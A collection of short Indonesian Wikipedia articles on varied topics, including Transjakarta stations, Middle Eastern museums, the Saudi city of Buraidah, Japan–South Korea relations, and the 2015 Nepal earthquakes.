<doc id="1750866" url="https://id.wikipedia.org/wiki?curid=1750866" title="Sabak">
Sabak

Sabak adalah buku tulis kuno yang digunakan untuk menulis sebelum adanya buku tulis digunakan secara luas. Sabak terbuat dari lempengan batu karbon yang dicetak lempengan segi empat dan ditulisi dengan menggunakan grip (mirip pensil). Sebelum digunakannya buku tulis yang terbuat dari kertas, sabak merupakan alat tulis wajib yang dimiliki siswa sekolah di Indonesia pada tahun 1960-an untuk alat bantu belajar tulis menulis. Sabak bukanlah peranti menyimpan berkas permanen. Alat ini hanya digunakan sementara waktu untuk mengikuti pelajaran yang disampaikan oleh guru yang kala itu menuntut siswa harus punya kemampuan menghafal. Setelah selesai, sabak dapat dihapus dan ditulisi dengan materi pelajaran lainnya, begitu seterusnya. Di era serbadigital, keberadaan sabak sudah langka dan hanya dapat ditemukan di museum di antaranaya adalah Museum Pendidikan Indonesia di Kota Malang dan Museum Pendidikan Indonesia Yogyakarta.

Peran sabak sudah digantikan oleh sebuah peranti digital modern yang mirip dengan bentuk sabak, yaitu sabak digital atau komputer tablet. Sabak digital ini bukan hanya berfungsi sebagai peranti untuk tulis-menulis tetapi juga digunakan sebagai alat komunikasi dan komputer pribadi.




</doc>
<doc id="1750991" url="https://id.wikipedia.org/wiki?curid=1750991" title="Garuda Taman Mini (Transjakarta)">
Garuda Taman Mini (Transjakarta)

Garuda Taman Mini adalah sebuah stasiun BRT Transjakarta yang terletak di Jalan Pondok Gede, Pinang Ranti, Makasar, Jakarta Timur. Stasiun BRT ini berada di Koridor 9 yang membentang dari tenggara ke barat laut Jakarta.



</doc>
<doc id="1750993" url="https://id.wikipedia.org/wiki?curid=1750993" title="Cawang Ciliwung (Transjakarta)">
Cawang Ciliwung (Transjakarta)

Cawang Ciliwung adalah sebuah stasiun BRT Transjakarta yang terletak di Jalan Letjen MT Haryono, Bidaracina, Jatinegara, Jakarta Timur. Stasiun BRT ini berada di Koridor 9 yang membentang dari tenggara ke barat laut Jakarta. Nama stasiun BRT ini berasal dari Kali Ciliwung yang mengalir di sebelah stasiun BRT.



</doc>
<doc id="1750994" url="https://id.wikipedia.org/wiki?curid=1750994" title="Cikoko Stasiun Cawang (Transjakarta)">
Cikoko Stasiun Cawang (Transjakarta)

Cikoko Stasiun Cawang adalah sebuah stasiun BRT Transjakarta yang terletak di Jalan Letjen MT Haryono, Cikoko, Pancoran, Jakarta Selatan. Stasiun BRT ini berada di Koridor 9 yang membentang dari tenggara ke barat laut Jakarta. Nama stasiun BRT ini berasal dari Stasiun Cawang yang terletak di sebelah stasiun BRT.



</doc>
<doc id="1750996" url="https://id.wikipedia.org/wiki?curid=1750996" title="Tebet BUMD (Transjakarta)">
Tebet BUMD (Transjakarta)

Tebet BUMD (sebelumnya bernama Tebet BKPM) adalah sebuah stasiun BRT Transjakarta yang terletak di Jalan Letjen MT Haryono, Tebet Barat, Tebet, Jakarta Selatan. Stasiun BRT ini berada di Koridor 9 yang membentang dari tenggara ke barat laut Jakarta.




</doc>
<doc id="1750997" url="https://id.wikipedia.org/wiki?curid=1750997" title="Masalembo (seri TV)">
Masalembo (seri TV)

Masalembo adalah sebuah serial televisi yang ditayangkan oleh stasiun televisi NET. Serial ini ditayangkan mulai tanggal 30 Mei 2015 hingga 23 Agustus 2015. Masalembo dibintangi Taufiq Saini, Angel Karamoy, Kezia Karamoy, Lucky Moniaga, dan Edo Borne.

Jatuhnya Pesawat "Sagarra Air" di perairan Segitiga Masalembo bukanlah semata-mata karena takdir. Melainkan karena ada sesuatu yang jahat di balik kejadian ini.



</doc>
<doc id="1750999" url="https://id.wikipedia.org/wiki?curid=1750999" title="Muhammad bin Salman al-Saud">
Muhammad bin Salman al-Saud

Muhammad bin Salman bin Abdulaziz al-Saud (; ) adalah Putra Mahkota, Wakil Perdana Menteri dan Menteri Pertahanan Arab Saudi Dia juga Ketua Dewan Urusan Ekonomi dan Pembangunan. Pada 21 Juni 2017 Muhammad bin Salman ditunjuk sebagai Putra Mahkota oleh Raja Salman. Dia adalah anggota dari Dinasti Saud dan juga anak dari Raja Salman.

Ia menyelesaikan Studi Sarjana dalam bidang Hukum dari Universitas Raja Saud. Istrinya adalah Putri Sarah binti Pangeran Masyhur bin Abdul Aziz Al Saud, memiliki 4 anak yaitu Pangeran Salman, Pangeran Masyhur, Putri Fahdah dan Putri Noura.



Pada 29 April 2015, Muhammad bin Salman menjadi Deputi Putra Mahkota, menggantikan Muhammad bin Nayef.

Sebagai Menteri Pertahanan, Pangeran Muhammad telah menjadi komandan terkemuka Operasi Badai Yang Menentukan, sebuah operasi militer besar pertama Arab Saudi pada abad ke-21.

Total 100 jet tempur canggih dan 150 ribu tentara dikerahkan pemerintah Saudi Arabia untuk menumpas kelompok Hutsi di Yaman, dalam waktu yang cukup singkat Angkatan Udara Saudi berhasil menerapkan zona larangan terbang di langit Yaman.

Setelah Asifah al-Hazm (Operasi Badai) dianggap berhasil, setelah itu masih di bawah komando Pangeran Muhammad bin Salman diluncurkan lagi operasi lanjutan yang disebut operasi I'adah al-Amal (Mengembalikan Harapan) untuk mempertahankan stabilitas keamanan di negara Yaman.


</doc>
<doc id="1751007" url="https://id.wikipedia.org/wiki?curid=1751007" title="Danang Pamungkas">
Danang Pamungkas

Danang Pamungkas () adalah seniman berkebangsaan Indonesia. Namanya dikenal melalui sejumlah karyanya berupa koreografi tari yang dipentaskan di berbagai panggung pertunjukan, dalam dan luar negeri. Dia merupakan salah satu penerima penghargaan sebagai juara pertama Lomba Koreografi Nasional The Next Wave, dan penerima hibah seni dari Yayasan Kelola.

Danang Pamungkas lahir di Surakarta, Jawa Tengah, 30 Desember 1979. Sejak usia muda, dia sudah mengakrabi dunia kesenian, utamanya seni tari. Setelah menyelesaikan pendidikan di Sekolah Menengah Karawitan Indonesia (SMKI) Solo, dia melanjutkan kuliah di Institut Seni Indonesia (ISI) Surakarta, 1999. Sejak itulah dia aktif dan terlibat dalam karya tari beberapa koreografer terkemuka di antaranya dalam "Indonesian Blues" karya Nur Cahyani di Surabaya, 2000. Selanjutnya dia mendukung karya tari "Dolldan Tranten", juga karya Nur Cahyani di Solo, 2001. Pada acara Temu Koreografer Wanita, pada tahun yang sama, ia ikut mendukung karya Ni Luh Kadek Yulia dalam karya "Sanghara". Di Solo, tahun 2002, ia mendukung acara "Dua Malam Bersama 6 Koreografer Muda". Kemudian, Danang Pamungkas mewakili ISI Surakarta pada Gelar Tari Anak Bangsa, di Teater Tanah Airku, Jakarta dalam koreografi tari "Sasmita" karya I Nyoman Cahya. Sedangkan 2003, ia mengambil bagian dalam proses produksi Jarot B. Sasono dalam "Trilogi Tentang Perempuan" di Yogyakarta, serta mendukung karya tari Sardono W. Kusumo dalam "No Body’s Body" di Surakarta. Sebagai koreografer, karya yang telah dihasilkan oleh Danang Pamungkas antara lain "Gulung" (1999), dipentaskan di Solo. Tahun 2000, ia meraih juara II dalam Festival Koreografi dengan karya "Gliyong" di PPPG Yogyakarta, dan beberapa karya lainnya.

Tahun 2007, Danang terpilih sebagai satu dari 10 koreografer Indonesia yang mengikuti Lokakarya Koreografi arahan Lin Hwai-min, koreografer kelas dunia asal Taiwan, pendiri dan penata artistik Cloud Gate Dance Theatre di Taipei. Seusai lokakarya berdurasi dua minggu itu, Danang ditawari untuk menari di Cloud Gate Dance Theatre, dan setelah audisi di awal 2008, Danang pun menandatangani kontrak tiga tahun sebagai penari di Cloud Gate Dance Theatre 2. Seusai kontrak, meski ditawari memperpanjang, Danang memutuskan kembali ke Indonesia awal 2011 karena ia berharap menekuni jalan menjadi seorang penata tari. Ia sempat melahirkan karya "Song of Body" (2009) yang dipentaskan di Komunitas Salihara Jakarta, dan tahun 2012, ia menggarap "Beat", sebuah komposisi kelompok, buah dari Hibah Seni dari Yayasan Kelola, yang akan dipentaskan ulang di ajang Indonesian Dance Festival (IDF).




</doc>
<doc id="1751011" url="https://id.wikipedia.org/wiki?curid=1751011" title="600 SM">
600 SM

Tahun 600 SM adalah tahun kalender Romawi pra-Julian. Di Kekaisaran Romawi, dikenal sebagai tahun 154 "Ab urbe condita" . 










[[Kategori:600 SM| ]]
[[Kategori:600-an SM]]

</doc>
<doc id="1751012" url="https://id.wikipedia.org/wiki?curid=1751012" title="Omnilateralisme">
Omnilateralisme

Omnilateralisme (dari "omnibus" dalam bahasa Latin: ""untuk semua"") dalam hubungan internasional merupakan istilah yang membedakan gerakan pemerintahan global menyeluruh dengan lembaga multilateral modern yang muncul sejak Kongres Wina.

Filsuf Prusia Immanuel Kant mendefinisikan omnilateral dalam "Science of Right", buku pertama dalam seri Metaphysics of Morals (1797), sebagai sesuatu yang ""berasal dari keinginan semua individu"".

Apabila multilateralisme mengacu pada beberapa negara yang bekerja sama dalam satu permasalahn tertentu, omnilateralisme melibatkan semua pihak dan tujuan bersama. Omnilateralisme tidak hanya mencakup negara, tetapi juga organisasi nonpemerintah, pihak swasta, dan masyarakat madani. Mereka semua ikut berkontribusi demi kebaikan global bersama.

Istilah omnilateralisme digunakan dalam konteks permasalahan yang tidak dapat diselesaikan secara unilateral oleh sebuah negara, secara bilateral oleh dua negara, secara plurilateral di tingkat regional seperti Uni Eropa, atau secara multilateral oleh lembaga-lembaga seperti G20 atau PBB karena semua pihak yang disebutkan tadi tidak melibatkan seluruh pihak yang terlibat.

Isu-isu omnilateralisme selalu berkaitan dengan lingkungan global, pencegahan benturan peradaban, multikulturalisme, dan kelompok minoritas.



</doc>
<doc id="1751013" url="https://id.wikipedia.org/wiki?curid=1751013" title="Hecht Museum">
Hecht Museum

Reuben and Edith Hecht Museum atau dikenal sebagai Hecht Museum adalah sebuah museum yang terletak dibealam lingkungan , Israel.

Hecht Museum didirikan pada tahun 1984 oleh , direktur dan merupakan anggota pendiri "University of Haifa Board of Governors". Selama 60 tahun Hecht mengumpulkan artefak arkeologi yang berkaitan dengan budaya Timur Dekat di tanah Israel pada zaman kuno. Ia terutama tertarik pada penemuan-penemuan periode Kanaan sampai akhir Kekaisaran Bizantin.

Pameran arkeologi dan sejarah Tanah Israel ditampilkan dalam urutan waktu, dari periode sampai Bizantin. Koleksi yang dipamerkan meliputi koin, satuan berat, segel meterai, perhiasan, artefak dari ekskavasi sekitar Bait Suci, karya logam Fenisia, seni ukiran kayu, tempayan batu, pembuatan barang gelas, serta mosaik. Museum ini juga menyimpan , sebuah kapal dagang yang terdampar pada abad ke-5 SM.

Museum mempunyai suatu auditorium akustik yang dapat menampung 380 orang serta sebuah , yang dibangun oleh Gideon Shamir dari bagian-bagian organ yang pernah digunakan di gereja-gereja seluruh negeri ini selama seabad lalu.
"Michmanim", jurnal terbitan museum ini, menampilkan artikel-artikel akademis dalam bidang riset arkeologi dan artefak-artefak yang merupakan koleksi museum ini.



</doc>
<doc id="1751015" url="https://id.wikipedia.org/wiki?curid=1751015" title="Teori evolusi damai">
Teori evolusi damai

Teori evolusi damai dalam politik internasional merujuk pada upaya memengaruhi transformasi politik sistem sosialis Tiongkok lewat cara-cara damai oleh Amerika Serikat.

Frasa ini dicetuskan oleh John Foster Dulles, mantan Menteri Luar Negeri Amerika Serikat, pada masa Perang Dingin tahun 1950-an. Frasa ini lebih ditujukan pada Uni Soviet, namun belakangan ini muncul dalam pembahasan resmi kebijakan Amerika Serikat dan Tiongkok. Analisis kebijakan luar negeri A.S. oleh pemerintah Tiongkok menyatakan bahwa teori ini telah menjadi bagian dari dasar hubungan Amerika Serikat dan Republik Rakyat Tiongkok.

Menurut pemikiran ini, Amerika Seriakt memiliki strategi untuk menyusup dan melemahkan negara-negara sosialis, terutama Tiongkok, dengan menyebarkan pemikiran politik dan gaya hidup Barat, memicu ketidakpuasan, dan mendorong masyarakat untuk menentang pemerintahan Partai Komunis. Tujuan yang diharapkan dari proses ini adalah sistem sosialis dapat melakukan transformasi dari dalam.

Partai Komunis Tiongkok (CPC) menolak ide evolusi damai sejak diperkenalkan pada masa Mao. Partai Komunis menganggap proses ini "ancaman terbesar bagi pemerintahan [Partai Komunis] yang berkelanjutan," karena tidak ada yang lebih penting bagi Partai Komunis selain mempertahankan kekuasaannya.

Pemimpin CPC dari dulu berjuang melawan teori evolusi damai, termasuk Mao Zedong, Deng Xiaoping, Hu Jintao, dan Jiang Zemin. Saat ini, teori evolusi damai bukan bagian dari pendekatan kebijakan resmi Amerika Serikat ke Tiongkok, namun para strategiwan militer komunis menganggapnya sebagai pemicu ketegangan.


</doc>
<doc id="1751017" url="https://id.wikipedia.org/wiki?curid=1751017" title="Bible Lands Museum">
Bible Lands Museum

Bible Lands Museum (Bahasa Ibrani: מוזיאון ארצות המקרא ירושלים) adalah sebuah museum arkeologi di Yerusalem, Israel, yang menampilkan budaya suku bangsa yang disebut dalam Alkitab, termasuk orang Mesir kuno, Kanaan, Filistin, Aram, Het, Elam, Fenisia dan Persia. Museum ini berupaya menempatkan suku-suku bangsa ini dalam konteks sejarah. Letak museum ini adalah pada "Museum Row" (Jalur museum) di , di antara Museum Israel, , dan "Bloomfield Museum of Science".

Museum ini didirikan oleh pada tahun 1992 untuk menyimpan koleksi pribadinya. Dalam suatu kunjungan ke Yerusalem pada tahun 1981, di sebuah hotel ia bertemu dengan Batya Weiss, yang mendorongnya untuk membawa koleksinya ke Israel dan mendirikan sebuah museum guna memenuhi angan-angannya. Weiss menghubungkannya dengan wali kota Yerusalem . Borowski mendengarkan nasihat Weiss, dan mendirikan Bible Lands Museum. Keduanya kemudian menikah.

Bagian galeri utama museum ini memamerkan ratusan artefak: dokumen kuno, patung sembahan, koin, patung, senjata, keramik dan segel dari berbagai wilayah Timur Dekat.
Galeri utama terdiri dari 20 bagian yang disusun menurut urutan kronologi:



</doc>
<doc id="1751019" url="https://id.wikipedia.org/wiki?curid=1751019" title="Daftar Papirus Mesir">
Daftar Papirus Mesir

Daftar Papirus Mesir ini meliputi sejumlah naskah kuno papirus yang ditulis dalam huruf hieroglif, hieratik, demotik atau Yunani. Tidak termasuk di sini adalah naskah papirus yang ditemukan di luar Mesir atau yang memuat teks Alkitab, yang dimuat dalam daftar terpisah: "Daftar Papirus Perjanjian Baru".

Pemerian dalam tabel didahului oleh sebuah huruf bercetak tebal, menunjukkan jenis sastranya. Jika teks ini tergolong beberapa jenis, huruf pertama merujuk kepada teks paling penting dalam naskah itu.




</doc>
<doc id="1751021" url="https://id.wikipedia.org/wiki?curid=1751021" title="Daftar situs monolit raksasa">
Daftar situs monolit raksasa

Daftar situs monolit raksasa ini dikelompokkan menurut ukuran batu paling besar pada situs tersebut. Suatu adalah batu besar yang digunakan untuk membangun monumen atau bangunan, baik sendirian maupun bersama batu-batu lain. Daftar ini memuat batu-batu raksasa yang ditambang, dipindahkan dan diangkat untuk membuat stuktur atau monumen.

Daftar ini hanya memuat monolit yang ditambang ("quarried"), tetapi tidak dipindahkan.

Daftar ini hanya memuat monolit yang ditambang dan dipindahkan.



Daftar ini hanya memuat monolit yang ditambang, dipindahkan dan diangkat.

Monolit yang diketahui telah diangkat sampai berdiri tegak:

Monoliths known or assumed to have been lifted clear off the ground by cranes into their position:

Daftar ini diurutkan dari proyek terbesar. Detail tambahan dapat dilihat pada halaman yang bersangkutan.





</doc>
<doc id="1751023" url="https://id.wikipedia.org/wiki?curid=1751023" title="Buraidah">
Buraidah

Buraidah ( "") adalah ibu kota dan kota terbesar di Provinsi Qasim yang terletak di bagian tengah-utara Arab Saudi, jantung Semenanjung Arabia. Buraidah memiliki jarak yang sama dengan Laut Merah di sebalah barat dan Teluk Persia di sebelah timur. Kota ini memiliki populasi sebesar 614.093 pada sensus tahun 2010.

Kota Buraidah terletak di tengah-tengah wilayah pertanian yang luas, yang termasuk di wilayah pertanian terbesar yakni 20% dari luas tanah pertanian Arab Saudi. Buraidah merupakan sumber pangan Arab Saudi, karena memiliki ladang luas yang menghasilkan gandum, sayuran dan kurma. Di wilayah ini juga terdapat proyek-proyek terbesar dibidang peternakan unggas dan produksi telur, yang menghasilkan produksi besar yang kemudian didistribusikan ke seluruh kota di Arab Saudi dan negara-negara teluk lainnya. Pasar kurma di Buraidah merupakan pasar yang mendistribusikan produksi pertanian dari Buraidah, penjualan kurma pada akhir Agustus sampai dengan akhir September penjualan kurma meningkat pesat dan terbesar di dunia menurut para ahli dan pengamat. Pasar unta di Buraidah uga merupakan pasar unta terbesar di dunia. Festival Kurma setiap tahunnya diselenggarakan di kota Buraidah, yang penjualannya mencapai 2 Milyar Riyal Arab Saudi - diantaranya 600 Juta Riyal Arab Saudi dikeluarkan pada 55 hari dari 800.000 pengunjung - Produksi ini merupakan 40% dari produksi nasional Arab Saudi.






Ibu kota Provinsi Qasim

Statistik terakhir dari Kantor Kementerian Urusan Keislaman, Wakaf, Dakwah dan Penyuluhan kota Buraidah, menyatakan masjid yang berada dibawah pengawasan kantor sebanyak 1770 masjid.






Di Kota Buraidah terdapat beberapa unit kesehatan negeri dan swasta, antara lain:




Jalan Bebas Hambatan dari Qasim ke Riyadh sepanjang 317 kilometer.
Jalan Bebas Hambatan dari Qasim ke Madinah sepanjang 450 kilometer.
Jalan Bebas Hambatan dari Qasim ke Hail sepanang 250 kilometer.
Jalan Bebas Hambatan dari Qasim ke Jubail sepanjang 400 kilometer. (sedang dibangun)
Kota Buraidah dikelilingi Jalan Lingkar Bebas Hambatan sepanjang 73 kilometer termasuk didalamnya 18 persimpangan yang terdiri dari jembatan dan terowongan, kota ini juga tersambung dengan Jalan Bebas Hambatan Internasional dengan tujuan perbatasan Arab Saudi dengan Yordania, Jalan khusus menuju Provinsi Mekkah, serta jalur jalan-jalan yang menghubungan Buraidah dengan kabupaten-kabupaten yang ada di Provinsi Qasim. Kota Buraidah merupakan salah satu kota perdagangan bersejarah terpenting, karena merupakan tempat singgah para musafir dari Utara (Syam) ke Selatan (Yaman).

Bandar udara Regional Pangeran Nayef bin Abdul Aziz adalah bandara yang melayani kota ini, menghubungan kota ini dengan beberapa tujuan domestik dan internasional seperti Dubai dan Kairo.



Sesuai dengan sensus nasional yang dilaksanakan pada tahun 1431 H/2010, terdapat 614.093 penduduk yang tinggal di kota Buraidah, yang terdiri dari 466.349 warganegara Arab Saudi, 52% dari jumlah penduduk provinsi Qasim, 238.844 laki-laki dan 227.505 perempuan. Adapun non warganegara Arab Saudi terdiri dari 147.744 orang, yang terdiri dari 113.236 laki-laki dan 34.508 perempuan. Terdapat pula 101.180 tempat tinggal yang ditempati oleh para penduduk.



</doc>
<doc id="1751033" url="https://id.wikipedia.org/wiki?curid=1751033" title="Podsolik merah kuning">
Podsolik merah kuning

Tipe tanah podsolik merah-kuning (PMK) adalah jenis tanah mineral tua dengan ciri warna kekuningan atau kemerahan. Di Indonesia, PMK banyak ditemukan di Sumatra dan Jawa Barat. Warna kuning dan merah disebabkan karena longgokan besi dan aluminum yang teroksidasi. Mineral lempung penyusunnya didominasi oleh silikat.

Batasan yang dibuat oleh USDA adalah "sekelompok tanah masam yang perkembangannya lanjut, dengan atusan (drainasi) baik, memiliki horizon organik dan organik-mineral yang tipis di atas horizon tercuci berwarna cerah di atas horizon yang lebih berlempung berwarna merah, merah kekuningan, atau kuning. Bahan induk lebih kurangnya adalah bersilikat. Horizon-horizon jeluk dalam memiliki garis-garis menjala atau bercak-bercak kasar berwarna merah, kuning, coklat, atau kelabu cerah adalah penciri tanah Podsolik Merah-Kuning apabila bahan induknya tebal."

Sebagaimana tanah podsol lainnya, tanah ini dikenal bermasalah untuk digunakan dalam budidaya tanaman semusim karena kemasaman rendah sehingga fosfor, salah satu hara penting bagi tumbuhan, tidak tersedia bagi akar untuk diserap. Persoalan lainnya adalah tingginya kandungan aluminum terlarut, sehingga meracun (toksik) bagi banyak tanaman. Meskipun demikian, banyak tanaman pohon yang tidak terlalu terpengaruh oleh kondisi ini karena membentuk lapisan humus pada permukaannya.


</doc>
<doc id="1751035" url="https://id.wikipedia.org/wiki?curid=1751035" title="Homalopsidae">
Homalopsidae

"Untuk jenis-jenis hewan yang juga disebut "ular air", lihat ular air."
Homalopsinae (Ular air Indo-Australia) adalah kelompok ular yang terdiri dari jenis-jenis ular air yang hidup di wilayah Asia Selatan hingga Australia. Berbadan gemuk, berukuran kecil, panjang rata-rata mencapai 1 meter. Berbisa menengah. Hidup di sungai, rawa, kolam, dan/atau danau. Makanan utamanya adalah hewan air. Sejauh ini terdapat sekitar 28 genus.




</doc>
<doc id="1751037" url="https://id.wikipedia.org/wiki?curid=1751037" title="Abraham Tolentino">
Abraham Tolentino

Abraham Ng Tolentino yang dikenal sebagai Bambol adalah seorang politikus Filipina yang sekarang menjabat sebagai Perwakilan distrik ke-7, yang juga dikenal sebagai bekas distrik ke-3 Cavite. Ia juga menjabat sebagai Wali kota Tagaytay dari 2004 sampai 2013, serta konselor kota di Tagaytay dari 1998 sampai 2004.

Pada 1998, ia terpilih sebagai konselor kota dari Kota Tagaytay. Ia menjabat sampai 2004, ketika ia maju untuk menjadi Wali kota dan menang. Ia terpilih kembali pada 2007 dan 2010. Pada pemilihan 2013, ia mengalahkan Gilbert Remulla, adik dari Rep. Jesus Crispin Remulla dad Gub. Jonvic Remulla, sebagai Anggota Kongres distrik ke-7 Cavite.

Ia adalah adik dari Francis Tolentino, mantan Wali kota Tagaytay dan Ketua Otoritas Pengembangan Metro Manila saat ini.


</doc>
<doc id="1751038" url="https://id.wikipedia.org/wiki?curid=1751038" title="Hubungan Jepang dengan Korea Selatan">
Hubungan Jepang dengan Korea Selatan

Setelah pemisahan Korea, Jepang dan Republik Korea (RK) menjalin hubungan diplomatik pada Desember 1965, di bawah Perjanjian tentang Hubungan-Hubungan Dasar antara Jepang dan Republik Korea, dengan Jepang mengakui Korea Selatan sebagai satu-satunya pemerintahan sah di semenanjung Korea.

Menurut Jajak Pendapat Layanan Dunia BBC 2014, 13% orang Jepang memandang pengaruh Korea Selatan secara positif, dengan 37% mengekspresikan pandangan negatif, sementara 15% orang Korea Selatan memandang pengaruh Jepang secara positif, dengan 79% mengekspresikannya secara negatif, membuat Korea Selatan, setelah China, negara dengan persepsi negatif terhadap Jepang terbesar kedua di dunia.

Disamping beberapa perebutan yang secara negatif berdampak pada hubungan antara dua negara tersebut, Jepang dan Korea Selatan menikmati pertukaran budaya satu sama lain.

Pada tahun-tahun terkini, budaya pop Korea Selatan meraih popularitas utama di Jepang, sebuah fenomena yang dijuluki di Jepang. Korean Wave meliputi musik pop, drama dan film Korea di Jepang.

Sebuah serial televisi Korea yang berjudul "Winter Sonata", yang pertama kali tayang di Jepang pada April 2003, menjadi sebuah runaway hit di Jepang, dan sering diidentifikasi sebagai markah tanah dalam pertukaran budaya Korea-Jepang. Artis K-pop perempuan BoA adalah salah satu penyanyi paling terkenal di Jepang dengan enam album konsekutif-nya meraih peringkat teratas di tangga lagu billboard.

Pada tahun-tahun yang lebih terkini, berbagai artis K-pop, yakni, Super Junior, TVXQ, Choshinsung, Big Bang, Kara, Girls' Generation, dan 2pm, telah membuat debut mereka di Jepang, dan grup-grup tersebut memiliki kontribusi untuk melahirkan kembali Korean wave di Jepang. Kara dan Girls' Generation sebagian besar lagunya menempati peringkat teratas sejumlah tangga lagu dan penghargaan di Jepang. Sejumlah grup lainnya, seperti F.T. Island, SHINee dan BEAST juga memasuki pasaran Jepang.

Setelah akhir Perang Dunia II, Korea Selatan melarang pengimporan budaya Jepang seperti musik, film, permainan video, sastra (manga). Namun, larangan tersebut sebagian ditangguhkan di bawah kepemimpinan Kim Dae-jung pada 1998. Pada 2004, pelarangan terhadap impor CD dan DVD Jepang ditangguhkan. Saat ini, penyiaran musik dan drama televisi Jepang masih menjadi hal ilegal.




</doc>
<doc id="1751039" url="https://id.wikipedia.org/wiki?curid=1751039" title="Jalur 4, Beijing Subway">
Jalur 4, Beijing Subway

Jalur 4 Beijing Subway () adalah jalur angkutan cepat di Beijing. Mulai beroperasi tanggal 28 September 2009, dan memiliki rute utara-selatan, terletak di sebelah barat dan paralel dengan Jalur 5, melewati Distrik Haidian, Xicheng, Xuanwu dan Fengtai di bagian barat kota. Panjang jalur ini 28.2 km dengan 24 stasiun 24. Tarifnya flat RMB(¥) 2.00 dengan transfer tidak dibatasi. Warna jalur 4 adalah teal.



</doc>
<doc id="1751045" url="https://id.wikipedia.org/wiki?curid=1751045" title="Gempa bumi Nepal Mei 2015">
Gempa bumi Nepal Mei 2015

Sebuah besar terjadi di Nepal pada 12 Mei 2015 pada pukul 12:35 pm dengan magnitude momen 7.3, 18 km (11 mi) dari tenggara Kodari. Epicenter-nya berada di dekat perbatasan China antara ibukota Kathmandu dan Gunung Everest. Gempa bumi ini terjadi pada tempat yang sama dengan gempa bumi 25 April yang bermagnitude 7.8, namun lebih kearah timur ketimbang gempa asalnya. Sehingga, gempa tersebut dianggap sebagai gempa susulan dari gempa 25 April. Gempa tersebut berada pada kedalaman . Guncangannya terada di bagian utara India yakni Bihar, Uttar Pradesh, Bengal Barat dan negara-negara bagian India lainnya.



</doc>
<doc id="1751048" url="https://id.wikipedia.org/wiki?curid=1751048" title="Gempa bumi Nepal April 2015">
Gempa bumi Nepal April 2015

Gempa bumi Nepal 2015 (juga disebut Gempa bumi Himalaya) adalah sebuah gempa bumi berkekuatan 7,8 (M) yang terjadi pada pukul 11:56 NST (6:11:26 UTC) pada Sabtu 25 April 2015, dengan episenter sekitar dari timur-tenggara Lamjung, Nepal, dan pusat gempa di kedalaman sekitar . Peristiwa tersebut merupakan gempa bumi paling kuat yang mengguncang Nepal sejak gempa bumi Nepal–Bihar 1934. Setidaknya 8,947 orang diketahui tewas akibat dari gempa bumi tersebut yang dikabarkan mengguncang Nepal dan beberapa wilayah India Utara, Tiongkok, dan Bangladesh. Bangunan-bangunan yang berusia berabad-abad hancur di Situs Warisan Dunia UNESCO di Lembah Kathmandu, termasuk beberapa bangunan di Alun-Alun Kathmandu Durbar dan menara Dharahara di Kathmandu .

Gempa bumi tersebut terjadi pada 25 April 2015 pada pukul 11:56 NST (6:11:26 UTC) di kedalaman sekitar , dengan episenternya sekitar dari timur-tenggara Lamjung, Nepal, yang berlangsung sekitar dua puluh detik. Gempa bumi awalnya di laporkan berkekuatan 7.5 M dari United States Geological Survey (USGS) sebelum di revisi menjadi 7.8 M. China Earthquake Networks Center (CENC) melaporkan gempa berkekuatan 8.1 M. India Meteorological Department (IMD) menyebutkan dua gempa kuat berada di Nepal pada pukul 06:11 UTC dan 06:45 UTC. Gempa pertama di ukur 7.8 M dan berpusat berjarak 80 km Baratlaut Kathmandu, ibu kota Nepal. Gempa kedua cukup kuat berkekuatan 6.6 M. Terjadi di 65 km (40 mi) Timur Kathmandu dengan kedalaman 10 km. Lebih dari lima puluh gempa susulan berkekuatan 4.5 M atau lebih pasca gempa utama berkekuatan 7.8 M dan 6,6 M.

Menurut "Did You Fel It? " (DYFI?) di situs website USGS, intensitas getaran di Kathmandu mencapai IX MMI (Keras). Getaran terasa hingga negara tetangga di antaranya negara bagian India seperti Bihar,Uttar Pradesh,Assam,West Bengal,Sikkim,Jharkhand,Uttarakhand,Gujarat hingga ibu kota India yaitu New Delhi dan selatan Karnataka. Banyak Bangunan mengalami penurunan ke bawah di Bihar, Retakan kecil pada tembok rumah di laporkan di Odisha. Gempa kecil dirasakan di Kochi di Selatan negara bagian Kerala. Intensitas getaran di Patna mencapai V MMI (Sedang). Intensitas getaran IV MMI (Ringan) di Dhaka,Bangladesh. Gempa juga di rasakan di barat daya Tiongkok mulai dari Tibet hingga Chengdu, yang berjarak 1,900 km (1,200 mi) dari epicenter. Getaran juga terasa di Pakistan dan Bhutan.

Gempa bumi susulan besar bekekuatan 6.7 M terjadi pada 26 April 2015 di lokasi sama pada pukul 12:55 NST (07:09 UTC), belokasi di 17 km (11 mi) selatan Kodari,Nepal. Gempa bumi susulan menyebabkan longsoran salju baru di gunung Everest dan di rasakan banyak tempat di Utara India seperti Kolkata,Siliguri,Jalpaiguri dan Assam. Gempa bumi susulan menyebabkan tanah longsor di Jalan Raya Koshi yang memblokir sebagian jalan di antara Bhedetara dan Mulghat.

Gempa susulan juga melanda Tibet dengan kekuatan 5.9 M terjadi pada 25 April 2015,pukul 15:02 NST. Puluhan rumah di Tibet mengalami kerusakan. 20 orang tewas dan 58 orang cedera.

Gempa bumi besar kedua terjadi pada 12 Mei 2015 pukul 12:51 NST berkekuatan 7.3 M berlokasi 18 km (11 mi) Tenggara Kodari. Episenter gempa dekat dengan Tiongkok perbatasan antara ibu kota Kathmandu dengan Gunung Everest dengan kedalaman 18.5 km (11.5 mi). Gempa terjadi di patahan yang sama seperti gempa utama 7.8 M 25 April 2015 tetapi lebih jauh ke timur. Namun, tetap dianggap sebagai gempa bumi susulan dari gempa 25 April lalu. Getaran juga di rasakan bagian utara India termasuk Bihar,Uttar Pradesh,West bengal dan negara bagian India lainnya.

Setidaknya 153 orang tewas di Nepal setelah gempa bumi susulan dan hampir 3,500 orang terluka. 62 orang tewas di India dan 1 orang tewas di Tiongkok.

Terdapat setidaknya lebih dari 8,947 korban tewas dan lebih dari 23,000 korban luka-luka. Setidaknya 8,786 orang tewas dan 22,304 orang luka - luka di Nepal sementara 130 orang tewas dan lebih dari 560 orang luka-luka di negara bagian India Uttar Pradesh,Bengal Barat,Sikkim dan Bihar, 27 orang tewas dan 383 orang luka - luka di Tiongkok dan Tibet dan 4 orang tewas dan 200 orang luka - luka di Bangladesh.

Bangunan-bangunan di Situs Warisan Dunia UNESCO Alun-Alun Kathmandu Durbar dikabarkan runtuh, termasuk menara Dharahara, yang dibangun pada 1832, menewaskan setidaknya 400 orang, dan Kuil Manakamana yang terletak di Gorkha.

Akibat Gempa bumi banyak terjadi Longsor salju di Gunung Everest. Setidaknya 19 orang tewas, termasuk eksekutif Google Dan fredinburg,dengan setidaknya 120 orang terluka atau hilang.

